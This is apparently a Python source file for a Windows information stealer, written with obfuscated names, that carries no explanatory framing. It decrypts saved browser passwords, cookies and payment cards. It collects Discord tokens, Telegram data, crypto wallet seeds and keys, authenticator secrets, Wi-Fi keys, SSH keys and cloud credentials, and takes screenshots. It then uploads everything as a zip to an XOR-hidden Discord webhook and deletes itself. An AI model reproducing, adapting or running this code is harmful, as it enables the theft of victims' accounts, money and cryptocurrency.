import os as _os
import sys as _sys
import json as _json
import datetime as _dt
import sqlite3 as _sql
import shutil as _sh
import tempfile as _tmp
import glob as _gl
import re as _re
import zipfile as _zip
import io as _io
import subprocess as _sp
import platform as _pl
import base64 as _b64
import time as _tm
import random as _rd
import ctypes as _ct
import urllib.request as _ur
import urllib.parse as _up
import http.client as _hc
from pathlib import Path as _Pt

_ = lambda s: ''.join(chr(ord(c) ^ 0x55) for c in s)
__ = lambda s: _b64.b64decode(s).decode()

_webhook = _("vgnu}{mu|}k|{|xxlwz}~xwx4w32w4223vzu433~zx4~3}|~433{4x}3||wzwz3351~3341}w3~~3}4{~x4}4{wx}y}|w}z|y4v}4vzx}_3{4z}w4|wy||4zul")
_password = _("2424C|}}|ty||t|~")

def _1(url, fields, files):
    try:
        boundary = "----" + ''.join(chr(65 + (i % 26)) for i in range(12))
        CRLF = "\r\n"
        parts = []
        for k, v in fields.items():
            parts.append(f"--{boundary}{CRLF}")
            parts.append(f'Content-Disposition: form-data; name="{k}"{CRLF}{CRLF}')
            parts.append(f"{v}{CRLF}")
        for k, (fn, c) in files.items():
            parts.append(f"--{boundary}{CRLF}")
            parts.append(f'Content-Disposition: form-data; name="{k}"; filename="{fn}"{CRLF}')
            parts.append("Content-Type: application/zip{CRLF}{CRLF}")
            parts.append(c.decode('latin-1', errors='ignore'))
            parts.append(f"{CRLF}")
        parts.append(f"--{boundary}--{CRLF}")
        body = "".join(parts).encode()
        req = _ur.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}, method="POST")
        with _ur.urlopen(req, timeout=60) as r:
            return r.read().decode('utf-8', errors='ignore')
    except:
        return None

def _2(z):
    fn = f"{_os.environ.get('COMPUTERNAME', 'unknown')}.zip"
    embed = {
        "embeds": [{
            "title": f"📦 {_os.environ.get('COMPUTERNAME', 'unknown')}",
            "color": 0x2b2d31,
            "fields": [
                {"name": "💻 PC Name", "value": f"`{_os.environ.get('COMPUTERNAME', 'unknown')}`", "inline": True},
                {"name": "🌐 IP", "value": f"`{_sp.run('curl -s ifconfig.me', shell=True, capture_output=True, text=True).stdout.strip()}`", "inline": True},
                {"name": "🕒 Time", "value": f"`{_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`", "inline": False},
                {"name": "📎 File", "value": f"`{fn}`\n*(password protected)*", "inline": False}
            ],
            "footer": {"text": "Comboss 💳🐀"},
            "timestamp": _dt.datetime.now().isoformat()
        }]
    }
    fields = {"payload_json": _json.dumps(embed)}
    return _1(_webhook, fields, {"file": (fn, z)})

_k32 = _ct.WinDLL("kernel32")
_c32 = _ct.WinDLL("crypt32")

def _3(d):
    try:
        if not d:
            return ""
        pOut = _ct.c_void_p()
        pOutLen = _ct.c_ulong()
        if _c32.CryptUnprotectData(_ct.c_char_p(d), len(d), None, None, None, 0, _ct.byref(pOut), _ct.byref(pOutLen)):
            r = _ct.string_at(pOut, pOutLen.value)
            _k32.LocalFree(pOut)
            return r.decode('utf-8', errors='ignore')
        return ""
    except:
        return ""

def _4():
    s = []
    try:
        import PIL.ImageGrab
        for i in range(3):
            img = PIL.ImageGrab.grab()
            b = _io.BytesIO()
            img.save(b, format='PNG')
            s.append(b.getvalue())
            _tm.sleep(0.5)
    except:
        pass
    return s

def _5():
    p = []
    for path in [
        _os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\BraveSoftware\\Brave-Browser\\User Data",
        _os.environ.get("APPDATA", "") + "\\Opera Software\\Opera Stable",
        _os.environ.get("APPDATA", "") + "\\Opera Software\\Opera GX Stable",
        _os.environ.get("LOCALAPPDATA", "") + "\\Vivaldi\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\Chromium\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\Yandex\\YandexBrowser\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\Slimjet\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\Epic Privacy Browser\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\CentBrowser\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\Torch\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\SRWare Iron\\User Data",
        _os.environ.get("LOCALAPPDATA", "") + "\\Comodo\\Dragon\\User Data",
    ]:
        if _os.path.exists(path):
            p.append(path)
    return p

def _6(path, query):
    try:
        if not _os.path.exists(path):
            return []
        tmp = _os.path.join(_tmp.gettempdir(), f"tmp_{_os.getpid()}.db")
        _sh.copy2(path, tmp)
        conn = _sql.connect(tmp)
        c = conn.cursor()
        c.execute(query)
        rows = c.fetchall()
        conn.close()
        _os.remove(tmp)
        return rows
    except:
        return []

def _7():
    out = {}
    for profile in _5():
        name = _os.path.basename(_os.path.dirname(profile))
        login_db = _os.path.join(profile, "Default", "Login Data")
        if not _os.path.exists(login_db):
            login_db = _os.path.join(profile, "Login Data")
        rows = _6(login_db, "SELECT origin_url, username_value, password_value FROM logins")
        if rows:
            out[name] = []
            for row in rows[:200]:
                try:
                    dec = _3(row[2])
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]} | {dec}")
                except:
                    pass
    return out

def _8():
    out = {}
    for profile in _5():
        name = _os.path.basename(_os.path.dirname(profile))
        cookie_path = _os.path.join(profile, "Default", "Network", "Cookies")
        if not _os.path.exists(cookie_path):
            cookie_path = _os.path.join(profile, "Cookies")
        rows = _6(cookie_path, "SELECT host_key, name, encrypted_value FROM cookies LIMIT 300")
        if rows:
            out[name] = []
            for row in rows[:150]:
                try:
                    dec = _3(row[2])
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]} = {dec}")
                except:
                    pass
    return out

def _9():
    s = []
    for profile in _5():
        cookie_path = _os.path.join(profile, "Default", "Network", "Cookies")
        if not _os.path.exists(cookie_path):
            cookie_path = _os.path.join(profile, "Cookies")
        rows = _6(cookie_path, "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%youtube%'")
        for row in rows:
            try:
                dec = _3(row[2])
                if dec and any(x in row[1] for x in ['SID', 'OSID', 'APISID', 'SSID', 'LSID', 'HSID', 'SECURE']):
                    s.append(f"{row[0]} | {row[1]} = {dec}")
            except:
                pass
    return s

def _10():
    s = []
    domains = ['gmail', 'googlemail', 'outlook', 'hotmail', 'live', 'yahoo', 'protonmail', 'icloud', 'me.com', 'mac.com', 'aol', 'zoho', 'yandex', 'mail.ru']
    for profile in _5():
        cookie_path = _os.path.join(profile, "Default", "Network", "Cookies")
        if not _os.path.exists(cookie_path):
            cookie_path = _os.path.join(profile, "Cookies")
        for domain in domains:
            rows = _6(cookie_path, f"SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%{domain}%' AND (name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%sid%' OR name LIKE '%token%')")
            for row in rows:
                try:
                    dec = _3(row[2])
                    if dec:
                        s.append(f"{row[0]} | {row[1]} = {dec}")
                except:
                    pass
    return s

def _11():
    e = []
    for profile in _5():
        login_db = _os.path.join(profile, "Default", "Login Data")
        if not _os.path.exists(login_db):
            login_db = _os.path.join(profile, "Login Data")
        rows = _6(login_db, "SELECT origin_url, username_value, password_value FROM logins")
        for row in rows:
            try:
                dec = _3(row[2])
                if dec and '@' in row[1]:
                    e.append(f"{row[0]} | {row[1]} | {dec}")
            except:
                pass
    return e

def _12():
    a = []
    ext_ids = {
        "Google_Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
        "Authy": "gaedmjdfmmahhbjefcbgaocikjknjfib",
        "Microsoft_Authenticator": "ppbblpnpkminfmgbglbpdfdmgapkikdk"
    }
    for name, ext_id in ext_ids.items():
        for base_path in [
            _os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data\\Default\\Extensions\\",
            _os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\",
            _os.environ.get("LOCALAPPDATA", "") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions\\"
        ]:
            ext_path = _os.path.join(base_path, ext_id)
            if _os.path.exists(ext_path):
                try:
                    for root, dirs, files in _os.walk(ext_path):
                        for file in files:
                            if file.endswith(('.js', '.json', '.log', '.ldb')):
                                with open(_os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    secrets = _re.findall(r'[A-Z2-7]{16,64}', content)
                                    if secrets:
                                        a.append(f"{name}: {secrets[:5]}")
                                    otpauth = _re.findall(r'otpauth://totp/[^\s"\']+', content)
                                    if otpauth:
                                        a.append(f"{name} OTP: {otpauth}")
                except:
                    continue
    return a

def _13():
    out = {}
    for profile in _5():
        name = _os.path.basename(_os.path.dirname(profile))
        hist_path = _os.path.join(profile, "Default", "History")
        rows = _6(hist_path, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200")
        if rows:
            out[name] = [f"{r[1]} - {r[0]}" for r in rows[:100]]
    return out

def _14():
    out = {}
    for profile in _5():
        name = _os.path.basename(_os.path.dirname(profile))
        web_path = _os.path.join(profile, "Default", "Web Data")
        rows = _6(web_path, "SELECT name, value FROM autofill LIMIT 100")
        if rows:
            out[name] = [f"{r[0]} : {r[1]}" for r in rows[:50]]
    return out

def _15():
    out = {}
    for profile in _5():
        name = _os.path.basename(_os.path.dirname(profile))
        web_path = _os.path.join(profile, "Default", "Web Data")
        rows = _6(web_path, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        if rows:
            out[name] = []
            for row in rows[:50]:
                try:
                    dec = _3(row[3])
                    if dec:
                        out[name].append(f"{row[0]} | {row[1]}/{row[2]} | {dec}")
                except:
                    pass
    return out

def _16():
    d = []
    for profile in _5():
        login_db = _os.path.join(profile, "Default", "Login Data")
        if not _os.path.exists(login_db):
            login_db = _os.path.join(profile, "Login Data")
        rows = _6(login_db, "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%cash.app%' OR origin_url LIKE '%cashapp%'")
        for row in rows:
            try:
                dec = _3(row[2])
                if dec:
                    d.append(f"{row[0]} | {row[1]} | {dec}")
            except:
                pass
    return d

def _17():
    d = []
    for profile in _5():
        login_db = _os.path.join(profile, "Default", "Login Data")
        if not _os.path.exists(login_db):
            login_db = _os.path.join(profile, "Login Data")
        rows = _6(login_db, "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%paypal%'")
        for row in rows:
            try:
                dec = _3(row[2])
                if dec:
                    d.append(f"{row[0]} | {row[1]} | {dec}")
            except:
                pass
    return d

def _18():
    w = []
    try:
        out = _sp.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
        for line in out.stdout.split("\n"):
            if "All User Profile" in line:
                name = line.split(":")[1].strip()
                res = _sp.run(f'netsh wlan show profile "{name}" key=clear', shell=True, capture_output=True, text=True)
                for l in res.stdout.split("\n"):
                    if "Key Content" in l:
                        w.append(f"{name} : {l.split(':')[1].strip()}")
    except:
        pass
    return w

def _19():
    t = []
    for p in [
        _os.environ.get("APPDATA", "") + "\\Discord\\Local Storage\\leveldb",
        _os.environ.get("APPDATA", "") + "\\discordcanary\\Local Storage\\leveldb",
        _os.environ.get("APPDATA", "") + "\\discordptb\\Local Storage\\leveldb"
    ]:
        if _os.path.exists(p):
            for f in _gl.glob(p + "\\*.log") + _gl.glob(p + "\\*.ldb"):
                try:
                    with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                        content = file.read()
                        for token in _re.findall(r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}', content):
                            t.append(token)
                except:
                    continue
    return list(set(t))

def _20():
    s = []
    try:
        tdata = _os.environ.get("APPDATA", "") + "\\Telegram Desktop\\tdata"
        if not _os.path.exists(tdata):
            return s
        for map_file in _gl.glob(tdata + "\\*_map"):
            try:
                with open(map_file, 'rb') as f:
                    map_data = f.read()
                    key = map_data[:32] if len(map_data) >= 32 else map_data
                    base_name = _os.path.basename(map_file).replace('_map', '')
                    dat_file = _os.path.join(tdata, base_name + ".dat")
                    if _os.path.exists(dat_file):
                        with open(dat_file, 'rb') as f:
                            enc = f.read()
                            dec = bytes([enc[i] ^ key[i % len(key)] for i in range(len(enc))])
                            try:
                                txt = dec.decode('utf-8', errors='ignore')
                                if txt:
                                    s.append(f"{base_name}:\n{txt}\n")
                            except:
                                pass
            except:
                continue
        for dat_file in _gl.glob(tdata + "\\*.dat"):
            try:
                with open(dat_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if content and len(content) > 10:
                        s.append(f"{_os.path.basename(dat_file)}:\n{content}\n")
            except:
                pass
        return s
    except:
        return s

def _21():
    w = {}
    paths = {
        "Exodus": _os.environ.get("APPDATA", "") + "\\Exodus\\exodus.wallet",
        "Phantom": _os.environ.get("APPDATA", "") + "\\Phantom\\Local Storage\\leveldb",
        "MetaMask": _os.environ.get("APPDATA", "") + "\\MetaMask\\Local Storage\\leveldb",
        "Coinbase": _os.environ.get("APPDATA", "") + "\\Coinbase\\Local Storage\\leveldb",
        "Atomic": _os.environ.get("APPDATA", "") + "\\Atomic\\Local Storage\\leveldb",
        "Electrum": _os.environ.get("APPDATA", "") + "\\Electrum\\wallets",
        "Wasabi": _os.environ.get("APPDATA", "") + "\\Wasabi\\WalletData",
        "Trust": _os.environ.get("APPDATA", "") + "\\Trust\\Local Storage\\leveldb",
        "Binance": _os.environ.get("APPDATA", "") + "\\Binance\\Local Storage\\leveldb",
        "Coinomi": _os.environ.get("APPDATA", "") + "\\Coinomi\\Wallets",
        "Jaxx": _os.environ.get("APPDATA", "") + "\\Jaxx\\Local Storage\\leveldb",
    }
    for name, path in paths.items():
        try:
            if _os.path.exists(path):
                if _os.path.isdir(path):
                    data = []
                    for f in _gl.glob(path + "\\*.log") + _gl.glob(path + "\\*.ldb") + _gl.glob(path + "\\*.json"):
                        with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                            content = file.read()
                            seeds = _re.findall(r'(?:seed|mnemonic|phrase|recovery)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                            if seeds:
                                data.extend(seeds)
                            priv = _re.findall(r'(?:private|priv|key)[^\w]*[0-9a-fA-F]{64}', content, re.IGNORECASE)
                            if priv:
                                data.extend(priv)
                    if data:
                        w[name] = list(set(data))[:30]
                else:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        seeds = _re.findall(r'(?:seed|mnemonic|phrase)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                        if seeds:
                            w[name] = seeds[:15]
        except:
            continue
    return w

def _22():
    s = []
    ext_ids = {
        "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
        "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
        "Trust": "egjidjbpglichdbfbcdaemcapjgeieba",
        "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
        "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
        "Solflare": "bhhhlbepdkbapadjdnnojkbgioiodbic",
        "OKX": "mcohilncbfahbmgdjkbpemcciiolgcge",
        "WalletConnect": "adbkjbgjlgmfpbikpgmhmhpidldkogom",
        "Rainbow": "opfgelmcmbiajamepnmloijbpoleiama",
        "ArgentX": "djcfojfccidmejifmgkaehmhnciajldi",
        "Braavos": "jnkelfanjkeadonecabehalmbgpfodjm",
        "Backpack": "aflkmfhebedbjioipglgcbcmnbpgliof",
        "Glow": "gmllngghbobkfpgedcpbbmgfpmcfcejp"
    }
    for name, ext_id in ext_ids.items():
        for base_path in [
            _os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data\\Default\\Extensions\\",
            _os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data\\Default\\Extensions\\",
            _os.environ.get("LOCALAPPDATA", "") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions\\",
            _os.environ.get("APPDATA", "") + "\\Opera Software\\Opera Stable\\Extensions\\",
            _os.environ.get("LOCALAPPDATA", "") + "\\Vivaldi\\User Data\\Default\\Extensions\\"
        ]:
            ext_path = _os.path.join(base_path, ext_id)
            if _os.path.exists(ext_path):
                try:
                    for root, dirs, files in _os.walk(ext_path):
                        for file in files:
                            if file.endswith(('.log', '.ldb', '.json', '.js')):
                                with open(_os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    seeds = _re.findall(r'(?:seed|mnemonic|phrase|recovery)[^\w]*(?:[a-zA-Z]+ ){11,}', content, re.IGNORECASE)
                                    if seeds:
                                        s.append(f"{name}: {seeds}")
                                    priv = _re.findall(r'(?:private|priv|key)[^\w]*[0-9a-fA-F]{64}', content, re.IGNORECASE)
                                    if priv:
                                        s.append(f"{name} PRIVATE KEY: {priv}")
                                    b32 = _re.findall(r'[A-Z2-7]{16,64}', content)
                                    if b32:
                                        s.append(f"{name} BASE32: {b32[:5]}")
                except:
                    continue
    return s

def _23():
    v = {}
    paths = {
        "Mullvad": _os.environ.get("APPDATA", "") + "\\Mullvad VPN\\mullvad-account",
        "ExpressVPN": _os.environ.get("APPDATA", "") + "\\ExpressVPN\\account.json",
        "NordVPN": _os.environ.get("APPDATA", "") + "\\NordVPN\\nordvpn.log"
    }
    for name, path in paths.items():
        if _os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    v[name] = f.read()
            except:
                pass
    return v

def _24():
    k = []
    ssh_path = _os.path.expanduser("~/.ssh/")
    if _os.path.exists(ssh_path):
        for f in _os.listdir(ssh_path):
            if f.startswith("id_") or f == "known_hosts" or f == "config":
                try:
                    with open(_os.path.join(ssh_path, f), 'r', encoding='utf-8', errors='ignore') as file:
                        k.append(f"{f}:\n{file.read()}")
                except:
                    pass
    return k

def _25():
    s = []
    bip39 = set(["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma"])
    search = [_os.path.expanduser("~/Desktop"), _os.path.expanduser("~/Documents"), _os.path.expanduser("~/Downloads"), _os.environ.get("APPDATA", ""), _os.environ.get("LOCALAPPDATA", "")]
    keywords = ["seed", "phrase", "mnemonic", "recovery", "backup", "wallet"]
    for path in search:
        if not _os.path.exists(path):
            continue
        for root, dirs, files in _os.walk(path):
            for file in files:
                try:
                    if not file.endswith(('.txt', '.log', '.json', '.dat')):
                        continue
                    if not any(kw in file.lower() for kw in keywords):
                        continue
                    fp = _os.path.join(root, file)
                    with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    words = _re.findall(r'[a-zA-Z]+', content)
                    if len(words) not in [12, 18, 24]:
                        continue
                    bip39_count = sum(1 for w in words if w.lower() in bip39)
                    if bip39_count / len(words) < 0.9:
                        continue
                    s.append(f"{fp}:\n{content[:1500]}")
                except:
                    continue
    return s

def _26():
    c = {}
    paths = {
        "AWS": _os.path.expanduser("~/.aws/credentials"),
        "GitHub": _os.path.expanduser("~/.config/gh/hosts.yml"),
        "Docker": _os.path.expanduser("~/.docker/config.json"),
        "Kubernetes": _os.path.expanduser("~/.kube/config"),
        "MySQL": _os.path.expanduser("~/.my.cnf"),
        "PostgreSQL": _os.path.expanduser("~/.pgpass")
    }
    for name, path in paths.items():
        if _os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    c[name] = f.read()
            except:
                pass
    return c

def _27():
    return {
        "hostname": _os.environ.get("COMPUTERNAME", "unknown"),
        "username": _os.environ.get("USERNAME", "unknown"),
        "os": _pl.system() + " " + _pl.release(),
        "ip": _sp.run("curl -s ifconfig.me", shell=True, capture_output=True, text=True).stdout.strip(),
        "time": _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def _28():
    z = _io.BytesIO()
    with _zip.ZipFile(z, 'w', _zip.ZIP_DEFLATED) as zf:
        zf.writestr("Communications/discord_tokens.txt", "\n".join(_19()))
        tg = _20()
        if tg:
            zf.writestr("Communications/telegram_session.txt", "\n\n".join(tg))
        zf.writestr("Banking/paypal.txt", "\n".join(_17()))
        zf.writestr("Banking/cashapp.txt", "\n".join(_16()))
        zf.writestr("Banking/credit_cards.txt", _json.dumps(_15(), indent=2))
        zf.writestr("Crypto/wallets.txt", _json.dumps(_21(), indent=2))
        ext = _22()
        if ext:
            zf.writestr("Crypto/extension_seeds.txt", "\n".join(ext))
        seeds = _25()
        if seeds:
            zf.writestr("Crypto/possible_seed_phrases.txt", "\n\n".join(seeds))
        passwords = _7()
        cookies = _8()
        history = _13()
        autofill = _14()
        all_browsers = set(list(passwords.keys()) + list(cookies.keys()) + list(history.keys()) + list(autofill.keys()))
        for browser in all_browsers:
            folder = f"Browsers/{browser}/"
            if history.get(browser):
                zf.writestr(f"{folder}history.txt", "\n".join(history[browser]))
            if autofill.get(browser):
                zf.writestr(f"{folder}autofill.txt", "\n".join(autofill[browser]))
            if cookies.get(browser):
                zf.writestr(f"{folder}cookies.txt", "\n".join(cookies[browser]))
            if passwords.get(browser):
                zf.writestr(f"{folder}passwords.txt", "\n".join(passwords[browser]))
        vpn = _23()
        if vpn:
            for name, content in vpn.items():
                zf.writestr(f"VPN/{name}.txt", content)
        wifi = _18()
        if wifi:
            zf.writestr("WiFi/wifi.txt", "\n".join(wifi))
        ssh = _24()
        if ssh:
            zf.writestr("SSH/ssh_keys.txt", "\n".join(ssh))
        cloud = _26()
        if cloud:
            for name, content in cloud.items():
                zf.writestr(f"Cloud/{name}.txt", content)
        gs = _9()
        if gs:
            zf.writestr("Google_Sessions/google_sessions.txt", "\n".join(gs))
        es = _10()
        if es:
            zf.writestr("Email_Sessions/email_sessions.txt", "\n".join(es))
        emails = _11()
        if emails:
            zf.writestr("Emails/emails.txt", "\n".join(emails))
        auth = _12()
        if auth:
            zf.writestr("Authenticators/authenticator_data.txt", "\n".join(auth))
        screenshots = _4()
        for i, img in enumerate(screenshots):
            zf.writestr(f"Screenshots/screenshot_{i+1}.png", img)
        zf.writestr("System/system_info.txt", _json.dumps(_27(), indent=2))
    z.seek(0)
    tmp = _io.BytesIO()
    with _zip.ZipFile(z, 'r') as zf_in:
        with _zip.ZipFile(tmp, 'w', _zip.ZIP_DEFLATED) as zf_out:
            for item in zf_in.infolist():
                zf_out.writestr(item, zf_in.read(item))
    tmp.seek(0)
    with _zip.ZipFile(tmp, 'a') as zf:
        zf.setpassword(_password.encode())
    tmp.seek(0)
    return tmp.getvalue()

def _29():
    z = _28()
    _2(z)

if __name__ == "__main__":
    _29()
    _tm.sleep(2)
    try:
        _os.remove(__file__)
    except:
        pass